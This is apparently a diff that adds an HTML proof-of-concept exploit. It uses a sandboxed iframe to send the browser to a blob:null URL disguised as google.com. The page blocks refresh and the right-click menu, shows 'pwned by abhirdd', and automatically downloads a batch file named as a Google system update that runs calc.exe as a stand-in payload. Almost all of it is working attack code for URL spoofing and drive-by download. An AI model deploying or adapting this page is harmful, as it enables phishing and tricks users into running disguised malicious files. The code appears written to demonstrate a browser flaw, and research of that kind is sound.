@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC: Blob Null Stability</title>
+<style>
+  body { margin:0; height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; justify-content:center; align-items:center; text-align:center; }
+  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; }
+</style>
+</head>
+<body>
+
+  <h1>Redirecting to <code>blob:null</code>...</h1>
+
+  <!--
+    IFRAME SANDBOXED (opaque origin):
+    Di dalam iframe ini, document.origin === "null", sehingga
+    URL.createObjectURL() menghasilkan "blob:null/<uuid>".
+    allow-top-navigation => iframe boleh navigasikan top-level ke blob tersebut.
+  -->
+  <iframe id="launcher" style="display:none" sandbox="allow-scripts allow-top-navigation"></iframe>
+
+  <script>
+    (function () {
+      const batLines = [
+        '@echo off',
+        'title Trusted Domain System Updater',
+        'echo Initializing secure update sequence...',
+        'timeout /t 2 >nul',
+        'echo Verifying system integrity...',
+        'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
+        'echo Update applied successfully.',
+        'pause'
+      ];
+
+      // Payload HTML utama (di-escape supaya aman dimasukkan ke srcdoc iframe)
+      const innerHTML = `<!DOCTYPE html>
+        <html><head><meta charset="utf-8"><title>google.com</title></head>
+        <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
+          <h1 style="margin:0;font-size:2rem;font-weight:500;color:#fff;">pwned by abhirdd</h1>
+
+          <img id="cat-img" src="https://cataas.com/cat?width=400&height=300&t=${Date.now()}" alt="cute cat"
+               style="max-width:400px;width:80vw;border-radius:12px;"
+               onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+          <div style="display:none;font-size:6rem;">🐱</div>
+
+          <p style="font-size:0.8rem;color:#666;margin-top:20px;user-select:none;">
+            (Anti-Crash Shield Active. Coba tekan F5 / Ctrl+R)
+          </p>
+
+          <script>
+            // =====================================================================
+            // FUNGSI UNIK: _0x4b10b() - Blob Stability Bypass Engine
+            // =====================================================================
+            function _0x4b10b() {
+              // Cegat Keyboard Refresh (F5, Ctrl+R, Cmd+R, Ctrl+F5)
+              window.addEventListener('keydown', function (e) {
+                const isReload = e.key === 'F5' ||
+                                 ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
+                if (isReload) {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  _0xFakeRefresh();
+                  return false;
+                }
+              }, true);
+
+              // Cegat Tombol Reload Browser
+              window.addEventListener('beforeunload', function (e) {
+                e.preventDefault();
+                e.returnValue = 'URL blob:null akan error jika di-refresh paksa!';
+                _0xFakeRefresh();
+                return e.returnValue;
+              });
+
+              // Cegat Klik Kanan
+              window.addEventListener('contextmenu', function (e) {
+                e.preventDefault();
+              });
+
+              // Aktifkan proteksi interaksi
+              document.body.addEventListener('click', function() {}, { once: true });
+            }
+
+            // Simulasi Refresh (Ganti gambar kucing, URL tetap sama)
+            function _0xFakeRefresh() {
+              const img = document.getElementById('cat-img');
+              if (img) {
+                img.style.opacity = '0';
+                setTimeout(() => {
+                  img.src = 'https://cataas.com/cat?width=400&height=300&t=' + Date.now();
+                  img.style.opacity = '1';
+                }, 150);
+              }
+              document.body.style.backgroundColor = '#1a1a1a';
+              setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 300);
+            }
+
+            _0x4b10b();
+
+            // TRIGGER DOWNLOAD .bat
+            const batLines = ${JSON.stringify(batLines)};
+            const batBlob = new Blob([batLines.join('\\r\\n')], { type: 'application/octet-stream' });
+            const batUrl = URL.createObjectURL(batBlob);
+            const a = document.createElement('a');
+            a.href = batUrl;
+            a.download = 'google.com_system_update.bat';
+            document.body.appendChild(a);
+            a.click();
+          <\/script>
+        </body></html>`;
+
+      // =====================================================================
+      // LAUNCHER: script yang dijalankan DI DALAM sandboxed iframe.
+      // Origin iframe = opaque ("null") => blob yang dibuat di sini
+      // otomatis jadi "blob:null/<uuid>".
+      // =====================================================================
+      const launcherScript = `
+        (function () {
+          var html = ${JSON.stringify(innerHTML)};
+          var blob = new Blob([html], { type: 'text/html' });
+          var url  = URL.createObjectURL(blob);
+          // bukti: url harusnya "blob:null/..." karena origin iframe opaque
+          console.log('[launcher] blob url =', url);
+          // Navigasi top-level ke blob (diizinkan oleh allow-top-navigation)
+          top.location.replace(url + '#%EF%BC%8Fgoogle.com');
+        })();
+      `;
+
+      const iframe = document.getElementById('launcher');
+      iframe.srcdoc = '<!DOCTYPE html><html><body><script>' +
+                      launcherScript +
+                      '<\/script></body></html>';
+    })();
+  </script>
+
+</body>
+</html>
